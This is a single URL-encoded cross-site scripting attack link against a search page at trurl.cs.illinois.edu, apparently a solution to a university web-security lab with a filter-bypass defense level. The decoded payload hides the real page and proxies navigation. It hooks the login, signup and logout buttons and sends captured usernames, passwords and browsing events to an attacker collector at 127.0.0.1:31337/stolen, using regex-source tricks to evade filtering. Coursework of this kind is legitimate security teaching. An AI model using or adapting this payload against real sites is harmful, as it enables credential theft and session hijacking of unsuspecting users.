http://trurl.cs.illinois.edu/search?xssdefense=2&q=%3Cimg%20src%3D%27xxx%27%20onerror%3D%27function%20payload(attacker)%20%7B%0A%0A%09var%20x%20%3D%20String(%2F.%5C%2F%20%2F)%3B%0A%09console.log(x)%3B%0A%09x1%20%3D%20x.substring(1%2Cx.length-4)%3B%20%0A%09x2%3D%20%20x.substring(3%2Cx.length-2)%3B%0A%09x%20%3D%20%20x1%2Bx2%0A%09console.log(x)%3B%0A%09var%20y%20%3D%20%2F%5C%2F%2F.source.substring(1)%3B%0A%09console.log(y)%3B%0A%09var%20link%20%3D%20%2Fhttp%3A%2F.source%20%2B%20y%2By%2B%2Ftrurl.cs.illinois.edu%2F.source%2By%3B%0A%09console.log(link)%3B%0A%09function%20proxy(href)%20%7B%0A%09%09%24(%2Fhtml%2F.source).load(href%2C%20function()%0A%09%09%7B%0A%09%09%09console.log(href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%2Fa%2F.source).filter(%2F%3Acontains(%3Cscript%3E)%2F.source).remove()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%2Fhtml%2F.source).show()%3B%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20window.onpopstate%20%3D%20function(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(document.location.href.split(%2F.edu%2F.source)%5B1%5D)%20%3B%20%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24(%2F%23logged-in-user%2F.source).text())%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.get(attacker%2C%7Bevent%3A%20%2Fnav%2F.source%2C%20user%3A%20%24(%2F%23logged-in-user%2F.source).text()%20%2C%20uri%3A%20href%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(!history.state)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09history.replaceState(null%2C%20null%2C%20href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24.get(attacker%2C%7Bevent%3A%20%2Fnav%2F.source%2C%20uri%3A%20href%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(!history.state)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09history.replaceState(null%2C%20null%2C%20href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%0A%09%09%09%24(%2F%23search-btn%2F.source).click(function(event)%0A%09%09%09%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09q%20%3D%20%24(%2F%23query%2F.source).val()%3B%0A%09%09%09%09history.pushState(href%2Cnull%2C%20%2Fsearch%3Fq%3D%2F.source%20%2B%20q)%3B%0A%09%09%09%09proxy(%2Fsearch%3Fq%3D%2F.source%20%2B%20q)%3B%0A%0A%09%09%09%7D)%3B%0A%0A%09%09%09%24(%2F%23search-again-btn%2F.source).click(function(event)%0A%09%09%09%7B%0A%09%09%09%09history.pushState(null%2Cnull%2Chref)%3B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09proxy(x)%0A%09%09%09%7D)%3B%0A%0A%0A%09%09%09%24(%2F%23bungle-lnk%2F.source).click(function(event)%20%0A%09%09%09%7B%0A%09%09%09%09history.pushState(null%2Cnull%2Chref)%3B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09proxy(x)%3B%0A%09%09%09%7D)%3B%0A%0A%09%09%09%24(%2F%23log-out-btn%2F.source).click(function(event)%0A%09%09%09%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%24.get(attacker%2C%7Bevent%3A%20%2Flogout%2F.source%2C%20user%3A%24(%2F%23logged-in-user%2F.source).text()%7D)%3B%0A%09%09%09%09%24.post(link%20%2B%20%2Flogout%2F.source%2Cfunction()%7B%0A%09%09%09%09%09history.pushState(null%2Cnull%2Cx)%3B%0A%09%09%09%09%09proxy(x)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D)%3B%0A%09%09%20%20%20%24(%2F%23log-in-btn%2F.source).click(function(event)%0A%09%09%20%20%20%7B%0A%09%09%20%20%20%20%09event.preventDefault()%3B%0A%0A%09%09%20%20%20%09%09%24.post(link%20%2B%20%2Flogin%2F.source%2C%20%0A%09%09%20%20%20%09%09%7Busername%3A%20%24(%2F%23username%2F.source).val()%2C%0A%09%09%20%20%20%09%09%20password%3A%20%24(%2F%23userpass%2F.source).val()%7D%2C%0A%09%09%20%20%20%09%09%20function()%20%7B%0A%09%09%20%20%20%09%09%20%09%24.get(attacker%2C%7Bevent%3A%20%2Flogin%2F.source%2C%20user%3A%20%24(%2F%23username%2F.source).val()%2Cpass%3A%20%24(%2F%23userpass%2F.source).val()%7D)%3B%0A%09%09%20%20%20%09%09%20%09proxy(x)%3B%0A%09%09%20%20%20%09%09%0A%0A%09%09%20%20%20%09%09%20%7D)%3B%0A%09%09%20%20%20%7D)%3B%0A%0A%09%09%20%20%20%24(%2F%23new-account-btn%2F.source).click(function(event)%0A%09%09%20%20%20%7B%0A%09%09%20%20%20%09event.preventDefault()%3B%0A%09%09%20%20%20%09%24.post(link%20%2B%20%2Fcreate%2F.source%2C%20%7Busername%3A%20%24(%2F%23username%2F.source).val()%2C%0A%09%09%20%20%20%20password%3A%20%24(%2F%23userpass%2F.source).val()%7D%2C%0A%09%09%20%20%20%20function()%7B%0A%09%09%20%20%20%20%09%24.get(attacker%2C%7Bevent%3A%20%2Fcreate%2F.source%2C%20user%3A%20%24(%2F%23username%2F.source).val()%2C%20pass%3A%20%24(%2F%23userpass%2F.source).val()%7D)%3B%0A%09%09%20%20%20%20%09proxy(x)%3B%0A%09%09%20%20%20%20%7D)%3B%0A%09%09%20%20%20%7D)%3B%0A%09%09%7D)%3B%0A%09%7D%0A%0A%09%24(%22html%22).hide()%3B%0A%09proxy(x)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%27%3E